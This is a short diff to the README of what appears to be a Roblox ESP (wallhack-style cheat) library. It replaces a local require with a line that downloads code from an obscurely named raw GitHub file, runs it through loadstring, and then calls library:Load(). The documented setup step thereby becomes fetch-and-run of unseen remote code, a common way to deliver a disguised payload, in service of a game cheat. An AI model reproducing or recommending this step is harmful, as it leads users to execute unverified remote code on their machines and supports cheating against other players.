@@ -47,4 +47,6 @@ Place the library as a ModuleScript in your Roblox project.
 Require it in your local/client script:
 
 ```lua
-local ESP = require(path.to.esp_library)
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ifykyklolololol/beebebeb/refs/heads/main/ddddd", true))();
+library:Load();
+
